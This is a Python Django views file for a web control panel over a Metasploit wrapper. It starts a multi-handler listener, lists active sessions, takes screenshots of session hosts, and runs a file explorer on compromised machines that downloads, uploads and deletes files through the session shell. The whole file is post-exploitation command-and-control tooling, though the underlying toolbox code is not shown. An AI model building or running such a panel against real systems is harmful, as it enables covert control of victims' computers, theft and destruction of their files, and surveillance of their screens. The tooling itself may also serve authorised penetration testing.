# -*- coding: utf-8 -*-
from __future__ import unicode_literals
from django.http import HttpResponse
import urllib
from django.shortcuts import render, redirect


from core.MsfToolbox import *
# Create your views here.

# Global
toolbox = MsfToolbox()


def init(request):
	toolbox.exploit_multi_handler()
	return redirect('sessions')


def jobs(request):
	jobs = toolbox.get_jobs()
	print jobs
	return render(request, 'server/jobs.html', {'jobs': jobs})


def home(request):
    return render(request, 'server/home.html')


def sessions(request):
	sessions = toolbox.get_sessions()
	return render(request, 'server/sessions.html', {'sessions': sessions})


def session(request, id):
	return render(request, 'server/session.html', {'id': int(id)})


def session_screenshot(request, id):
	toolbox.post_take_screenshot()
	images = toolbox.get_images()
	import time
	time.sleep(0.5)
	return render(request, 'server/session_screenshot.html', {'id': int(id), 'images': images})


def session_explorer(request, id):
	shell = toolbox.get_session_shell(int(id))

	path = request.GET.get('path')
	print 'path', path

	ftype = request.GET.get('type')
	print 'type', ftype

	delete = request.GET.get('delete', None)

	upload = request.FILES.get('file', None)
	print 'upload', upload

	if (upload != None):
		toolbox.upload(shell, upload)

	if path != None and ftype == 'dir':
		toolbox.cd(shell, path)
		return redirect('session', id)
	elif path != None and ftype == 'fil' and delete == None:
		return toolbox.download(shell, path)
	elif path != None and delete:
		if (ftype == 'dir'):
			toolbox.rmdir(shell, path)
		else:
			toolbox.rm(shell, path)

	(pwd, files) = toolbox.ls(shell)

	toolbox.add_routing_files(files)

	return render(request, 'server/session_explorer.html', {'id': int(id), 'files': files, 'pwd': pwd})
